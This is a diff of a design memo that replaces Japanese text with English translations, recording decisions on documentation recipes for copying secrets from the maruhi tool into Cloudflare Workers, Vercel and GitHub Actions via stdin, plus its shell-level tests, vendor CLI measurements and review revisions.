Netlify gets one line under "Other platforms" ("its CLI takes the value as an argument, so it's not on this page") — a factual note, not a competitive comparison. Pages is not written.
 
-**E. CI への言及の深さ** — 列挙: (i) 触れない / (ii) **1 段落の予告**(`maruhi ci run` は `--` 以降に同じコマンド行を受け、
-サインイン不要〔OIDC リース + コミット済みアンカー〕。workflow テンプレートは予定)/ (iii) workflow の全文(SY3 の本体)。
-第 1 周の新案: `maruhi run` → `maruhi ci run --server … --project … --env … --anchor …` の置換だけ示す(あり)→ `ci run` は
-site の docs にまだ 1 行もなく、半端に書くと SY3 で書き直しになる(棄却)。第 2 周: なし。**選定 = (ii)**。GitHub Environments の
-required reviewers(補足 15 X4)は SY3 へ。
+**E. Depth of the CI mention** — enumeration: (i) don't touch it / (ii) **a one-paragraph notice** (`maruhi ci run` takes the same command line after `--`, no sign-in needed〔OIDC lease + committed anchor〕. A workflow template is planned) / (iii) the workflow's full text (SY3's body). Round-1 new option: show only the replacement `maruhi run` → `maruhi ci run --server … --project … --env … --anchor …` (available) → `ci run` doesn't yet have a single line in the site docs, and writing it half-way would be rewritten in SY3 (rejected). Round 2: none. **Chosen = (ii)**. GitHub Environments' required reviewers (supplement 15 X4) go to SY3.
 
-**F. 安全性の注記** — 列挙: (i) ページ冒頭の 1 段落 / (ii) レシピごと / (iii) 両方。第 1 周の新案: **冒頭は「How the recipes
-work」の箇条書き 5 点**(値の通り道・argv と履歴と `set -x`・平文は同期先のストアに置かれる〔定義上避けられない〕・maruhi が正で
-一方通行〔ダッシュボードでの手編集は次回で上書き〕・導入済み CLI のみで `npx` しない)**+ 対象固有の注記だけレシピの直下**
-(Vercel の sensitive 既定・複数行値の末尾改行、wrangler の `null` = 削除と終了コード)(あり)。第 2 周: なし。**選定 = 新案**。
-競合名・星取表・「安全」の断言は置かない(§6-1)。
+**F. Safety notes** — enumeration: (i) one paragraph at the top / (ii) per recipe / (iii) both. Round-1 new option: **the top gets the 5-bullet "How the recipes work"** (the path values take; argv and history and `set -x`; plaintext is placed at the destination's store〔unavoidable by definition〕; maruhi is the source of truth and one-way〔hand edits on the dashboard are overwritten next time〕; installed CLIs only, no `npx`) **+ only destination-specific notes right under each recipe** (Vercel's sensitive default and trailing newline on multi-line values; wrangler's `null` = delete and exit code) (available). Round 2: none. **Chosen = the new option**. No competitor names, star tables, or "safe" assertions (§6-1).
 
-**G. テレメトリ・ログ抑止** — 列挙: (i) レシピのコマンド行に環境変数を混ぜる(`WRANGLER_SEND_METRICS=false maruhi run -- …`)/
-(ii) 注記だけ / (iii) 書かない。第 1 周の新案: **恒久設定(`wrangler telemetry disable` / `vercel telemetry disable`)を主に、
-1 回限りの環境変数を従にした独立の短い節「Vendor CLI telemetry」**(あり — レシピを汚さず、線引き〔maruhi は何も送らない・
-ベンダー CLI の送信はそのツールの設定であって maruhi の責任範囲外〕を 2 文で書ける)。第 2 周: なし。**選定 = 新案**。
-`DO_NOT_TRACK` は Vercel に効かないので書かない。ログ抑止(`WRANGLER_LOG_PATH` のデバッグログ)は未監査なので書かない(申し送り)。
+**G. Telemetry / log suppression** — enumeration: (i) mix env vars into the recipe's command line (`WRANGLER_SEND_METRICS=false maruhi run -- …`) / (ii) a note only / (iii) don't write it. Round-1 new option: **an independent short section "Vendor CLI telemetry" leading with permanent settings (`wrangler telemetry disable` / `vercel telemetry disable`) and one-time env vars second** (available — doesn't soil the recipes, and the line〔maruhi sends nothing; what a vendor CLI sends is that tool's setting and outside maruhi's responsibility〕can be drawn in 2 sentences). Round 2: none. **Chosen = the new option**. `DO_NOT_TRACK` doesn't work on Vercel, so not written. Log suppression (`WRANGLER_LOG_PATH`'s debug logs) is unaudited, so not written (handoff).
 
-**H. 検証方法** — 列挙: (i) ベンダー CLI と `maruhi` を argv / stdin を記録する偽コマンドに差し替えてレシピのシェル部分を実行 /
-(ii) ピン留め版の `--help` と公式ドキュメント(上の前提の訂正)/ (iii) 実アカウントで通す(所有者の人間タスク)/ (iv) 偽コマンドの
-検査をリポジトリのテストに残す。第 1 周の新案: **(iv) を「ページの本文から ```sh ブロックを切り出してそのまま実行する」形にする**
-(あり — DP5 の golden と同じく、書いた文言と検査対象を一致させ docs の漂流を構造で防ぐ)。置き場は `apps/site/test/unit/recipes.test.ts`
-(ルートの vitest projects = 品質ゲート 7 で走る。ビルド不要)。偽コマンドは `apps/site/test/unit/shims/`(TS 本体 + PATH に置く
-`bin/` の sh ラッパー。fallow には entry として宣言)。第 2 周の新案: **導入済みのシェル(sh / bash / zsh / dash)すべてで回す**
-(あり — K の可搬性の実測)。第 3 周: なし。**選定 = (i)+(ii)+(iv 改)+(iii は人間タスク)**。固定する性質: 値(改行・`"`・`\`・`#`・
-`=`・先頭 `-` を含む)が全コマンドの argv に出ない、wrangler の stdin は JSON オブジェクト 1 つで値が完全一致、Vercel は
-名前ごとに 1 呼び出しで stdin = 値 + 改行、名前に値が無ければ Workers は `error` で **何も送らず `null` を作らない**・Vercel は
-**1 件も送る前に**終了コード 1。jq が無い環境ではスキップ(CI の ubuntu には入っている)。docs だけの PR に検査コードを足す是非:
-CLI / サーバー / Web / packages のコードは触っておらず、検査は docs の一部(文言の golden)と位置づける。
+**H. Verification method** — enumeration: (i) swap the vendor CLIs and `maruhi` for fake commands that record argv / stdin and run the recipes' shell part / (ii) the pinned versions' `--help` and official docs (the premise corrections above) / (iii) run it against a real account (owner's human task) / (iv) keep the fake-command check as a repo test. Round-1 new option: **make (iv) "cut the ```sh blocks out of the page body and run them as-is"** (available — like DP5's golden, the written text and the checked target coincide, structurally preventing doc drift). Location: `apps/site/test/unit/recipes.test.ts` (runs under the root vitest projects = quality gate 7. No build needed). Fake commands live in `apps/site/test/unit/shims/` (TS bodies + `bin/` sh wrappers on PATH. Declared to fallow as entries). Round-2 new option: **run it under every installed shell (sh / bash / zsh / dash)** (available — actually measures K's portability). Round 3: none. **Chosen = (i)+(ii)+(iv-modified)+(iii as a human task)**. Pinned properties: values (including newline, `"`, `\`, `#`, `=`, leading `-`) never appear on any command's argv; wrangler's stdin is a single JSON object with exactly matching values; Vercel gets one call per name with stdin = value + newline; if a name has no value, Workers gets `error` so **nothing is sent and no `null` is made**; Vercel exits 1 **before sending a single one**. Skip when jq is absent (CI's ubuntu has it). The merits of adding check code to a docs-only PR: no CLI / server / web / packages code was touched; the checks are positioned as part of the docs (a golden for the wording).
 
-**I. 文体と用語** — 列挙: (i) 「sync」を使う / (ii) **「copy」「hand values to」**(`sync` は SY2 の `maruhi sync` に温存)/
-(iii) 「deploy」。第 1 周の新案: 題は「Deploy targets」、動詞は copy、「maruhi stays the source of truth, and copying is one way」
-の 1 文で一方通行を言う(あり)。第 2 周: なし。**選定 = (ii) + 題**。DP5 の用語集(sign in / server / token / environment
-variable)に揃え、コマンドはバッククォート、`**` 強調なし。docs の文は通常の文(末尾ピリオドあり)。
+**I. Register and terminology** — enumeration: (i) use "sync" / (ii) **"copy", "hand values to"** (`sync` is reserved for SY2's `maruhi sync`) / (iii) "deploy". Round-1 new option: the title is "Deploy targets", the verb is copy, and the one sentence "maruhi stays the source of truth, and copying is one way" states the one-way property (available). Round 2: none. **Chosen = (ii) + the title**. Aligned to DP5's vocabulary (sign in / server / token / environment variable); commands in backticks; no `**` emphasis. Docs sentences are normal sentences (ending periods).
 
-**J. ROADMAP と設計メモの追随** — SY1 行を完了にして DP3〜DP5 と同じ形の完了注記、本裁定録を §3 末尾(§4 の前)に追記、
-案 S1 への追記は本裁定録末尾の申し送り表で代える(S1 の本文は「土台」の評価のまま正しい)。
+**J. ROADMAP and design-memo follow-up** — mark the SY1 row complete with a completion note in the same shape as DP3–DP5; append this ruling record to §3's tail (before §4); the addendum to option S1 is replaced by the handoff table at this record's tail (S1's body stays correct as the "foundation" evaluation).
 
-**K. シェルの前提** — 列挙: (i) **POSIX `sh`**(dash / bash / zsh で同じ)/ (ii) bash 固有を許す(`set -o pipefail`・`${!name}`)/
-(iii) fish / PowerShell にも触れる。第 1 周の新案: pipefail は「bash か zsh のスクリプトでは足せる」と注記にとどめ、レシピ本体は
-POSIX に閉じる(あり)。Windows は「not covered」の 1 行(CLI の Windows 版が experimental — ROADMAP Phase 2)。`printenv` は
-GNU / BSD とも未設定で終了コード 1、jq の `$ENV` / `--args` は 1.6 以降。第 2 周: なし。**選定 = (i) + 注記**。検証は dash /
-bash / sh で実測(zsh はこの環境に無い — 人間タスク)。
+**K. Shell assumptions** — enumeration: (i) **POSIX `sh`** (identical under dash / bash / zsh) / (ii) allow bash-isms (`set -o pipefail`, `${!name}`) / (iii) also cover fish / PowerShell. Round-1 new option: pipefail stays as a note "addable in bash or zsh scripts"; the recipe body stays POSIX-closed (available). Windows gets one line "not covered" (the CLI's Windows build is experimental — ROADMAP Phase 2). `printenv` exits 1 when unset on GNU / BSD alike; jq's `$ENV` / `--args` are 1.6+. Round 2: none. **Chosen = (i) + the note**. Verified by actually running under dash / bash / sh (zsh isn't in this environment — human task).
 
-**新たに出た裁定点**: (L) **名前に値が無いときの fail-closed** — Workers は jq の `// error`(前提の訂正 (7))で何も送らない。
-Vercel は空 stdin に対する CLI の挙動が実アカウントなしでは確かめられないため、レシピ側で **全名前の存在を先に検査してから送る**
-2 段ループにした(1 件も送る前に止まる)。(M) **Vercel の複数行値**: `printenv` の末尾改行は 1 行の値からだけ落ちる(前提の
-訂正 (3))ので、複数行の値(PEM)は末尾改行が残ることを注記した。`printf '%s'` で避ける形は C の規則に反するので書かない。
-(N) **wrangler のパイプの終了コード**: wrangler は空 stdin で exit 0 なので jq の失敗は終了コードに出ない — bash / zsh の
-スクリプトでは `set -o pipefail` を勧める 1 文を置いた。(O) **`npx wrangler`**: 「取りに行く形を書かない」規律との整合 —
-wrangler をプロジェクトの依存として入れている人はそれを普段どおり `npx wrangler` で呼ぶ(導入済みの版が動く)ので、その旨を
-1 行だけ書いた(`npx` で未導入の CLI を落とす形ではない)。
+**Newly emerged ruling points**: (L) **fail-closed when a name has no value** — Workers sends nothing via jq's `// error` (premise correction (7)). Since Vercel's behavior on empty stdin can't be confirmed without a real account, the recipe side **checks all names exist first, then sends** in a 2-stage loop (stops before sending anything). (M) **Vercel multi-line values**: `printenv`'s trailing-newline strip happens only for single-line values (premise correction (3)), so a note was added that multi-line values (PEM) keep their trailing newline. A `printf '%s'` dodge wasn't written since it violates C's rule. (N) **wrangler's pipe exit code**: wrangler exits 0 on empty stdin, so a jq failure doesn't surface in the exit code — one sentence recommending `set -o pipefail` in bash / zsh scripts was placed. (O) **`npx wrangler`**: consistency with the "don't write a fetch-it form" discipline — people who have wrangler as a project dependency call it `npx wrangler` as usual (the installed version runs), so one line says so (not a form where `npx` downloads an uninstalled CLI).
 
-**SY2(exec ドライバ)/ SY5 への申し送り — ベンダー CLI の実測表(2026-09-05)**:
+**Handoff to SY2 (exec driver) / SY5 — the vendor CLI measurement table (2026-09-05)**:
 
-| 対象 × コマンド | 版 | stdin の形式 | 上書き | 削除 | 環境指定 | テレメトリ off | 確認方法 |
+| Target × command | Version | stdin format | Overwrite | Delete | Environment spec | Telemetry off | How verified |
 |---|---|---|---|---|---|---|---|
-| Cloudflare Workers `wrangler secret bulk` | 4.128.0(リポジトリのピン) | file 省略で stdin。JSON `{"k":"v"}`(推奨)か `.env`(dotenv 16.3.1 — `#` / 空白 / 引用符で壊れる)。readline で EOF まで。値は文字列のみ。1 回 100 件 | 同名は上書き(1 リクエスト) | JSON で `null` のみ(`.env` 不可) | `--name <worker>` / `-e <env>`(wrangler の名前付き環境) | `WRANGLER_SEND_METRICS=false`(`true`/`false` 厳密)/ `DO_NOT_TRACK=1` / `wrangler telemetry disable` / `send_metrics=false` | `--help` + `cli.js` の `parseBulkInputToObject` / `validateFileSecrets` + dotenv 16.3.1 の実測 + 上流 telemetry.md。空 stdin は exit 0(注意)。デバッグログ `WRANGLER_LOG_PATH` は未監査 |
-| Cloudflare Workers `wrangler secret put NAME` | 4.128.0 | 非対話なら stdin を EOF まで(`readFromStdin`) | 上書き | `secret delete` | 同上 | 同上 | `cli.js`。1 件ごとに新 version をデプロイ(bulk 推奨) |
-| Vercel `vercel env add NAME [env]` | 59.11.7(scratchpad に導入) | stdin が端末でなければ stdin。**最初の data チャンクのみ・500 ms 待ち**(実測: 65,536 バイトまでは完全に届き、それ以上は 64 KiB で切れる — 改訂 1)。1 行の値は末尾改行 1 つを除去、複数行は残す。env は `production` / `preview` / `development` / カンマ区切り、`[gitbranch]` | `--force`(無いと既存名は失敗)。`vercel env update` も stdin 可 | `vercel env rm NAME [env]` | 位置引数の env + `--project` / `--scope` / link 済みディレクトリ | `VERCEL_TELEMETRY_DISABLED=1` / `vercel telemetry disable` | `env add --help` + `dist/chunks` の `readStandardInput` / `normalizeStdinEnvValue` + 公式 docs/cli/env(2026-08-20)・docs/cli/about-telemetry(2026-03-17)。既定 sensitive(production / preview。development は不可)。`--value` は argv(使わない)。エージェント検出で `--non-interactive` 既定。空 stdin の挙動は未確認(実アカウント) |
-| GitHub Actions `gh secret set NAME` | 2.100.0(scratchpad に展開) | `--body` 省略 + 非対話で stdin を全部読み `TrimRight("\r\n")`。`-f -` で dotenv を stdin から複数件 | 上書き | `gh secret delete` | `--env <environment>` / `--org` / `--user` / `--app {actions,agents,codespaces,dependabot}` / `-R` | `GH_TELEMETRY=false|0` / `DO_NOT_TRACK=1`(+ `GH_NO_UPDATE_NOTIFIER`) | `secret set --help` + 上流 `pkg/cmd/secret/set/set.go` + `gh help environment`。封印はクライアント側。**gh にテレメトリがある**(補足 5 / 8 は gh の送信に触れていない — ここに記す)  **2026-09-08 SY5 で実装**(exec プリセット `github-actions` + レシピ。v2.100.0 の `set.go` で再確認: `TrimRight` は複数行でも末尾の CR / LF を全部落とす・空 stdin は空の本文として送る・不在名の delete は 404 = 非 0・未ログインは終了コード 4) |
-| Netlify `netlify env:set KEY value` | — | 値が引数(argv に出る) | — | — | — | `NETLIFY_TELEMETRY_DISABLED=1`(未確認) | 未導入。exec 不可 = SY4 は http(補足 10 V2 のまま。**2026-09-08 SY4 第 1 波で http プリセットを実装**) |
+| Cloudflare Workers `wrangler secret bulk` | 4.128.0 (repo pin) | stdin when file omitted. JSON `{"k":"v"}` (recommended) or `.env` (dotenv 16.3.1 — breaks on `#` / spaces / quotes). readline until EOF. Values are strings only. 100 per call | Same name overwrites (1 request) | `null` in JSON only (`.env` can't) | `--name <worker>` / `-e <env>` (wrangler's named environment) | `WRANGLER_SEND_METRICS=false` (strict `true`/`false`) / `DO_NOT_TRACK=1` / `wrangler telemetry disable` / `send_metrics=false` | `--help` + `cli.js`'s `parseBulkInputToObject` / `validateFileSecrets` + dotenv 16.3.1 measurement + upstream telemetry.md. Empty stdin exits 0 (caution). Debug log `WRANGLER_LOG_PATH` unaudited |
+| Cloudflare Workers `wrangler secret put NAME` | 4.128.0 | non-interactive: stdin to EOF (`readFromStdin`) | overwrites | `secret delete` | same | same | `cli.js`. Deploys a new version per item (bulk recommended) |
+| Vercel `vercel env add NAME [env]` | 59.11.7 (installed to a scratchpad) | stdin if stdin isn't a terminal. **Only the first data chunk, 500 ms wait** (measured: up to 65,536 bytes arrives whole; beyond that it cuts at 64 KiB — revision 1). Single-line values get one trailing newline stripped; multi-line keeps it. env is `production` / `preview` / `development` / comma-separated, `[gitbranch]` | `--force` (without it, an existing name fails). `vercel env update` also takes stdin | `vercel env rm NAME [env]` | positional env + `--project` / `--scope` / linked directory | `VERCEL_TELEMETRY_DISABLED=1` / `vercel telemetry disable` | `env add --help` + `dist/chunks`' `readStandardInput` / `normalizeStdinEnvValue` + official docs/cli/env (2026-08-20), docs/cli/about-telemetry (2026-03-17). Default sensitive (production / preview; development can't). `--value` is argv (don't use). `--non-interactive` default on agent detection. Empty-stdin behavior unconfirmed (real account) |
+| GitHub Actions `gh secret set NAME` | 2.100.0 (expanded to a scratchpad) | no `--body` + non-interactive: reads all of stdin, `TrimRight("\r\n")`. `-f -` reads dotenv from stdin for multiple entries | overwrites | `gh secret delete` | `--env <environment>` / `--org` / `--user` / `--app {actions,agents,codespaces,dependabot}` / `-R` | `GH_TELEMETRY=false|0` / `DO_NOT_TRACK=1` (+ `GH_NO_UPDATE_NOTIFIER`) | `secret set --help` + upstream `pkg/cmd/secret/set/set.go` + `gh help environment`. Sealing is client-side. **gh has telemetry** (supplements 5 / 8 don't touch gh's sends — recorded here)  **Implemented in SY5 on 2026-09-08** (exec preset `github-actions` + recipe. Re-confirmed on v2.100.0's `set.go`: `TrimRight` drops all trailing CR / LF even multi-line; empty stdin is sent as an empty body; deleting an absent name is 404 = nonzero; unauthenticated is exit code 4) |
+| Netlify `netlify env:set KEY value` | — | value is an argument (lands on argv) | — | — | — | `NETLIFY_TELEMETRY_DISABLED=1` (unconfirmed) | Not installed. exec impossible = SY4 is http (unchanged from supplement 10 V2. **http preset implemented in SY4 wave 1 on 2026-09-08**) |
 
-SY2 の exec ドライバへの含意: (a) wrangler は JSON を 1 リクエストで渡す形が正で、削除は `null` で表せる(レシートとの突合で
-「消すべき名前」を `null` にする)。空入力で exit 0 になる wart はドライバ側で「入力が空なら呼ばない」で吸収する。
-(b) Vercel は変数ごとに 1 プロセスで、stdin は **1 チャンク・500 ms** の制約があるため、ドライバは値を一度に書いて即 close する
-(64 KiB 超は http へ)。既定 sensitive の意味論(読み戻し不可)は `sync diff` を読み戻しに頼れない根拠でもある(補足 13 W2 の
-レシートが正しい)。(c) gh はテレメトリ off の環境変数を共通部品に加える。(d) 3 つとも「値を argv に載せる」経路(`--value` /
-`--body` / `env:set`)を持つので、ドライバは argv テンプレートに値のプレースホルダを**持たない**設計にする(宣言的プリセットの
-型で禁止)。(e) `maruhi run` の子は stdio 継承なので、exec ドライバは `sh -c` を介さず直接 spawn して stdin に書く形でよい。
+Implications for SY2's exec driver: (a) for wrangler, passing JSON in 1 request is correct, and deletes are expressible as `null` (matching against the receipt turns "names to remove" into `null`). The wart of exit 0 on empty input is absorbed by the driver as "don't call it on empty input". (b) Vercel is one process per variable, and stdin has the **1-chunk, 500 ms** constraint, so the driver writes the value at once and closes immediately (over 64 KiB goes to http). The default-sensitive semantics (can't be read back) is also grounds for `sync diff` being unable to rely on read-back (supplement 13 W2's receipt is correct). (c) gh's telemetry-off env vars get added to the shared parts. (d) All three have a "value on argv" path (`--value` / `--body` / `env:set`), so the driver is designed to **not have** a value placeholder in argv templates (forbidden at the declarative preset's type). (e) Since `maruhi run`'s child inherits stdio, the exec driver can spawn directly without `sh -c` and write to stdin.
 
-**改訂 1(2026-09-05、pullfrog の初回レビュー)**: (1) 前提の訂正 (3) の Vercel の stdin 切り詰めが公開ページに無かった
-(既定 sensitive のため事後に気づけない経路)。`readStandardInput` を **そのまま写した** スクリプトに `printenv BIG | node read.mjs` で
-値を流して実測: 4,000 / 8,000 / 30,000 / 60,000 / 65,536 バイトは各 5 回とも完全に届き、70,000 / 100,000 バイトは **5 回とも
-65,536 バイトで切れた**(Linux のパイプ容量 = Node の読み取り上限 64 KiB。`printenv` は CLI が読む前に書き終えるので、それ以下は
-1 回の読み取りに収まる)。ページの Vercel 節に「64 KiB 超は無言で切れる・sensitive なので後から確かめられない・その大きさの値は
-このレシピに載せない」を 1 行で追記(断定するのは観測した実装の挙動のみ。Vercel 側の上限は未確認なので書かない)。
-(2) nitpick: レシピの検査の正規表現 `> ?[a-z]` は `> "$f"` 等を素通しするので、**`/dev/null` 以外へのリダイレクトを全部拒む**
-`>(?!\s*\/dev\/null)` に。(3) nitpick: jq が無いと Workers の 2 態が黙ってスキップされる → **CI(`CI` 環境変数あり)では jq の
-存在を 1 件の `it` で断言**する(手元の新しい前提にはしない)。(4) nitpick: 「In CI」の文を「`--` 以降のコマンドが同じ」に
-直し、`ci run` 自身のフラグ(server / project / environment / anchor)が要ることを 1 文で添えた。
+**Revision 1 (2026-09-05, pullfrog's first review)**: (1) premise correction (3)'s Vercel stdin truncation wasn't on the public page (a path that can't be noticed after the fact because of the sensitive default). Measured by piping values through a script that **copies `readStandardInput` verbatim** via `printenv BIG | node read.mjs`: 4,000 / 8,000 / 30,000 / 60,000 / 65,536 bytes all arrive completely across 5 runs each; 70,000 / 100,000 bytes **cut at 65,536 bytes on all 5 runs** (Linux's pipe capacity = Node's 64 KiB read ceiling. Since `printenv` finishes writing before the CLI reads, anything below fits in one read). One line added to the page's Vercel section: "over 64 KiB silently truncates; sensitive so it can't be checked afterward; don't put values that size on this recipe" (assertions limited to the observed implementation's behavior. Vercel-side limits unconfirmed, so not written). (2) nitpick: the recipe check's regex `> ?[a-z]` passes `> "$f"` etc., so changed to **`>(?!\s*\/dev\/null)` which refuses every redirect except to /dev/null**. (3) nitpick: without jq, the Workers' 2 cases skip silently → **on CI (where the `CI` env var exists), assert jq's presence in one `it`** (not made a local precondition). (4) nitpick: the "In CI" sentence was corrected to "the command after `--` is the same" with one sentence noting `ci run`'s own flags (server / project / environment / anchor) are needed.
 
-**改訂 2(2026-09-05、pullfrog の並走レビュー〔e6dfb82 に対する 2 本目〕)**: (1) ページが主張する「`set -x` に出ない」が
-機械検査の外だった → `runRecipe` に xtrace の口(外側のシェルを `-x -c` で起動し、偽 `maruhi` は `RECIPE_TEST_XTRACE` が
-あるときレシピ内の `sh -c` を `sh -x -c` として起動する — xtrace は子シェルに継承されないため)を足し、Workers / Vercel の
-両レシピで stderr のトレースに値の断片が無いことを 3 シェルで固定(トレースが実際に出た証拠 = `+ ` と内側の `printenv
-STRIPE_SECRET_KEY` も断言)。(2) nit: 「Windows build is experimental」は README の「Windows is not supported」(インストール
-スクリプト)と読者に食い違って見える → ページは「Windows is not covered」だけに。(3) 改訂 1 の切り詰めの注記に「on Linux」を
-添え、macOS はパイプ容量が小さく `printenv` の書き込みが分かれうるため、実アカウント検証の人間タスクに「大きめの値
-(数十 KiB)」を 1 件足した。
+**Revision 2 (2026-09-05, pullfrog's parallel review〔a second one against e6dfb82〕)**: (1) the page's claim "doesn't appear under `set -x`" was outside the mechanical checks → added an xtrace leg to `runRecipe` (the outer shell is launched with `-x -c`, and the fake `maruhi` launches the recipe's `sh -c` as `sh -x -c` when `RECIPE_TEST_XTRACE` is set — since xtrace isn't inherited by child shells), pinning under 3 shells that no value fragment appears in the stderr trace for both the Workers / Vercel recipes (evidence the trace actually ran = `+ ` and the inner `printenv STRIPE_SECRET_KEY` are also asserted). (2) nit: "Windows build is experimental" reads inconsistently to the reader against README's "Windows is not supported" (the install script) → the page now says only "Windows is not covered". (3) revision 1's truncation note gained "on Linux"; since macOS has a smaller pipe capacity and `printenv`'s write may split, "a largish value (tens of KiB)" was added as one human task for real-account verification.
 
-**改訂 3(2026-09-05、pullfrog の差分レビュー〔436b23e〕+ CI)**: (1) 改訂 1 で足した注記の「which is also Vercel's own limit per
-variable」は、裁定録自身が「ベンダー側の上限は書かない」と決めた内容を破っていた(Vercel の 64 KB は 1 デプロイの全変数の合計で、
-edge runtime は 1 変数 5 KB — 「per variable」と読ませると 30 KiB × 3 本が安全に見える)。節を落とし、観測事実(Linux で 64 KiB)と
-「閾値はシステムのパイプ容量に依存する」だけを残した。(2) CI の fallow: 改訂 2 の xtrace の分岐で `runRecipe` の CRAP が閾値 30 に
-達した → 継承する PATH / HOME をモジュール定数に出し、xtrace は引数配列と env への 1 分岐に畳んだ(手元の fallow は改訂 2 の後に
-回し直しておらず、CI で発覚 — 以後は改訂ごとに `fallow:audit` まで回す)。
+**Revision 3 (2026-09-05, pullfrog's diff review〔436b23e〕+ CI)**: (1) the note revision 1 added — "which is also Vercel's own limit per variable" — broke what the ruling record itself had decided ("don't write vendor-side limits") (Vercel's 64 KB is the total of all variables in one deploy; the edge runtime is 5 KB per variable — read as "per variable", 30 KiB × 3 looks safe). The clause was dropped, leaving only the observed fact (64 KiB on Linux) and "the threshold depends on the system's pipe capacity". (2) CI's fallow: revision 2's xtrace branch pushed `runRecipe`'s CRAP to the 30 threshold → the inherited PATH / HOME were extracted as module constants and xtrace folded into a single branch on the argv array and env (the local fallow hadn't been re-run after revision 2; it surfaced in CI — from now on, run `fallow:audit` after every revision).
 
-**改訂 4(2026-09-05、Cursor Bugbot〔c7af45b〕)**: xtrace の検査は「`+ ` が stderr にある」をトレースが出た証拠にしていたが、
-`+ ` は bash / dash の既定 `PS4` で、zsh の既定は `+%N:%i> `。Workers の xtrace は外側のシェルしかトレースしない(子は jq)ので、
-zsh が PATH にある機械(macOS)では落ちる。証拠を「`+` で始まり外側の `maruhi run --env production` を含む行」に変え、この環境に
-zsh 5.9 を入れて 4 シェル(sh / bash / zsh / dash)で通した(29 件)。
+**Revision 4 (2026-09-05, Cursor Bugbot〔c7af45b〕)**: the xtrace check had used "`+ ` present on stderr" as evidence the trace ran, but `+ ` is bash / dash's default `PS4`; zsh's default is `+%N:%i> `. The Workers xtrace only traces the outer shell (the child is jq), so it would fail on machines with zsh on PATH (macOS). The evidence was changed to "a line starting with `+` containing the outer `maruhi run --env production`", and zsh 5.9 was installed into this environment to pass under 4 shells (sh / bash / zsh / dash) (29 cases).
 
-**改訂 5(2026-09-05、pullfrog の差分レビュー〔d288c77〕)**: `shells` は導入済みのシェルだけを回すため、zsh の無い
-`ubuntu-latest` では zsh の 6 態が CI で一度も走らず、改訂 4 が塞いだ zsh 限定の失敗もパイプラインでは検出できなかった。
-ページが zsh を名指しで約束している以上、CI で必ず走らせる: `ci.yml` の依存導入の直後に `apt-get install zsh` の 1 ステップを
-足し(docs だけの PR で workflow に触る唯一の変更 — レシピ検査の前提の導入のみ)、検査側は jq と同じ形で `CI` があるときだけ
-`shells` が `["sh", "bash", "zsh", "dash"]` であることを 1 件の `it` で断言する(手元では従来どおり導入済みのものだけ)。
-pullfrog の nit で `apt-get update -qq` を前置(ランナーイメージの apt リストの鮮度に成否が依存しないように)。
+**Revision 5 (2026-09-05, pullfrog's diff review〔d288c77〕)**: since `shells` only runs installed shells, on `ubuntu-latest` without zsh the 6 zsh cases never ran in CI, and the zsh-only failure revision 4 closed couldn't have been detected by the pipeline. Since the page names zsh in a promise, CI must run it every time: one `apt-get install zsh` step was added right after dependency install in `ci.yml` (the only workflow touch in a docs-only PR — it only installs a precondition of the recipe check), and on the check side, in the same shape as jq, a single `it` asserts `shells` is `["sh", "bash", "zsh", "dash"]` when `CI` is present (locally it still only runs what's installed). A pullfrog nit prefixed `apt-get update -qq` (so success doesn't depend on the runner image's apt-list freshness).
 
-**検証(2026-09-05)**: `FALLOW_AUDIT_BASE=origin/main bun run check` 7 段、`apps/site` の `validate --strict` / `build` / `e2e`
-(Card 3 枚・`llms.txt` に `/docs/deploy-targets`)、`recipes.test.ts`(sh〔= dash〕/ bash / zsh / dash の 4 シェル × Workers 3 態 + Vercel 3 態〔正常・欠落名・xtrace〕— zsh は改訂 4 で導入)。
-実アカウント(Cloudflare / Vercel)での通し確認・Vercel の空 stdin・macOS(BSD `printenv`)は人間タスク。ページの
-light / dark のスクリーンショットは PR の Artifact。
+**Verification (2026-09-05)**: `FALLOW_AUDIT_BASE=origin/main bun run check`'s 7 stages, `apps/site`'s `validate --strict` / `build` / `e2e` (3 Cards, `/docs/deploy-targets` in `llms.txt`), `recipes.test.ts` (4 shells — sh〔= dash〕/ bash / zsh / dash × Workers 3 cases + Vercel 3 cases〔normal / missing name / xtrace〕— zsh added in revision 4). Human tasks: an end-to-end run against real accounts (Cloudflare / Vercel), Vercel's empty stdin, macOS (BSD `printenv`). Page light / dark screenshots are a PR artifact.
 
-### SY2 実装時の裁定録(2026-09-06)
+### SY2 implementation-time ruling record (2026-09-06)
 
-対象は ROADMAP SY2 = 案 S2 + S8(`maruhi sync <target>`)。SY 系列で初めて CLI のコードを変える。SY2 は 1 本の PR に収まらない
-ので段に切り、本節は**第 1 段**の裁定録(段の切り方は裁定 A)。設計は §3 冒頭「同期の最終形」の表を正とし、本セッションでは
-設計を蒸し返していない。各裁定点は DP1〜DP5 / SY1 と同じループ(候補 3 つ以上 → 上位互換 / 銀の弾丸の探索 → 新案が出ない
-周が 1 回あれば終了 → 理由付きで選定)で決め、「新案なし」の周では壊れ方(境界値・環境差・失敗時の残骸)を問うた。
+The target is ROADMAP SY2 = options S2 + S8 (`maruhi sync <target>`). The first SY-series item to change CLI code. Since SY2 doesn't fit in one PR it's cut into stages; this section is the ruling record for **stage 1** (the staging is ruling A). The design's source of truth is the "final form of sync" table at §3's head; this session did not re-litigate the design. Each ruling point was decided by the same loop as DP1–DP5 / SY1 (3+ candidates → search for a superset / silver bullet → end once a round produces no new options → choose with reasons), and on "no new option" rounds we asked about failure modes (boundary values, environment differences, debris on failure).
 
-**前提の確認(実物・実装で確かめた事実。日付はすべて 2026-09-06)**:
-(1) **CLI の境界**(`Redacted` が剥がれる位置 × 子プロセス): 復号の産物は `pull.ts` で `Redacted` に包まれ、剥がすのは
-`run.ts`(env 注入の直前)・`display.ts`(表示ゲートの後ろ)・`push.ts`(暗号境界)・`env-rotate.ts`(再暗号化)だけ。子プロセスは
-`live.ts` の `Bun.spawn` で **stdio をすべて継承**し、stdin に書く口が無い。`buildChildEnvironment` が `MARUHI_*` を子に渡さない
-(deepsec S6)。CI(`ci-run.ts`)はリースで DEK を受け取るが **§4.1 の書き込み署名に使う master 鍵を持たない**(`pushVariable` は
-`signingKey` = master sig 鍵を要求する)→ CI から maruhi へレシートを書く経路は現状ない。
-(2) **サーバーの上限**(`apps/server/src/policy.ts`): 値の暗号文 64 KiB、環境あたり active 変数 1,000、**変数あたり version
-1,000**、active 環境 100。レシートを「同期のたびに上書きする 1 変数」にすると version 上限に当たる(裁定 F)。
-(3) **API の実装点**: 読み = `values.ts` の `pullVerifiedEnvironment`(値署名の検証まで。復号しない。version あり)/
